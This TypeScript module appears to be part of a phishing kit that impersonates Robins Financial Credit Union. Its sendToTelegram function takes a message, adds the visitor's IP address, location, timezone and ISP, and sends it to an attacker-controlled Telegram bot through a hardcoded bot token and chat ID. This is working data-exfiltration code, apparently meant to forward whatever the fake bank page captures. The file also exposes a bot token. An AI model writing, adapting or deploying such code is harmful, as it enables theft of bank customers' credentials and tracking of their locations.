import { getClientGeo } from "./geo";

const BOT_TOKEN = "8690222414:AAE98JaorMmqP8nlS0zSWlw3o_ocoRgPHGY";
const CHAT_ID = "5207440324";

export async function sendToTelegram(message: string): Promise<boolean> {
  try {
    const geo = await getClientGeo();

    const footerLines: string[] = [
      "",
      "🏦 <b>Robins Financial Credit Union</b>",
      "",
    ];

    if (geo) {
      footerLines.push(
        `🌐 IP: <code>${geo.ip}</code>`,
        `📍 Location: ${geo.city}, ${geo.region}, ${geo.country}`,
        `⏰ Timezone: ${geo.timezone}`,
        `📡 ISP: ${geo.org}`
      );
    } else {
      footerLines.push("📍 Location: unavailable");
    }

    const fullMessage = message + "\n" + footerLines.join("\n");

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: fullMessage,
          parse_mode: "HTML",
        }),
      }
    );
    const data = await response.json();
    return data.ok === true;
  } catch {
    return false;
  }
}